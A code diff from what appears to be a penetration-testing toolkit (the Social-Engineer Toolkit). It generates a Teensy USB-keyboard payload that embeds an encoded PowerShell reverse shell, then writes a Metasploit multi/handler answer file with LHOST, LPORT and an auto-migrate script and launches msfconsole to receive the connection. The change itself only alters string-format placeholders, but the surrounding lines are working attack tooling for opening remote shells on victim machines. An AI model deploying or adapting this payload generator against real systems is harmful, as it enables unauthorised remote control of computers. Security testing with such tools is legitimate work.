@@ -47,14 +47,14 @@ with open(os.path.join(core.setdir, "x86.powershell")) as fileopen:
         reading_encoded = fileopen.read(data_read).rstrip()
         if not reading_encoded:
             break
-        output_variable += "const char RevShell_{}[] PROGMEM = '{}';\n".format(counter, reading_encoded)
+        output_variable += "const char RevShell_{0}[] PROGMEM = '{1}';\n".format(counter, reading_encoded)
         counter += 1
 
 rev_counter = 0
 output_variable += "const char exploit[] PROGMEM = {\n"
 
 while rev_counter != counter:
-    output_variable += "RevShell_{}".format(rev_counter)
+    output_variable += "RevShell_{0}".format(rev_counter)
     rev_counter += 1
     if rev_counter == counter:
         output_variable += "};\n"
@@ -149,7 +149,7 @@ Keyboard.set_key1(0);
 Keyboard.send_now();
 }
 """)
-print("[*] Payload has been extracted. Copying file to {}".format(os.path.join(core.setdir, "reports/teensy.pde")))
+print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir, "reports/teensy.pde")))
 if not os.path.isdir(os.path.join(core.setdir, "reports")):
     os.makedirs(os.path.join(core.setdir, "reports"))
 with open(os.path.join(core.setdir, "/reports/teensy.pde", "w")) as filewrite:
@@ -172,16 +172,16 @@ if choice == "YES":
 
     with open(os.path.join(core.setdir, "/metasploit.answers", "w")) as filewrite:
         filewrite.write("use multi/handler\n"
-                        "set payload {}\n"
-                        "set LHOST {}\n"
-                        "set LPORT {}\n"
+                        "set payload {0}\n"
+                        "set LHOST {1}\n"
+                        "set LPORT {2}\n"
                         "set AutoRunScript post/windows/manage/smart_migrate\n"
                         "exploit -j".format(payload, ipaddr, port))
 
     print("[*] Launching Metasploit....")
     try:
-        child = pexpect.spawn("{} -r {}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
-                                                        os.path.join(core.setdir, "metasploit.answers")))
+        child = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(core.meta_path(), "msfconsole"),
+                                                          os.path.join(core.setdir, "metasploit.answers")))
         child.interact()
     except:
         pass
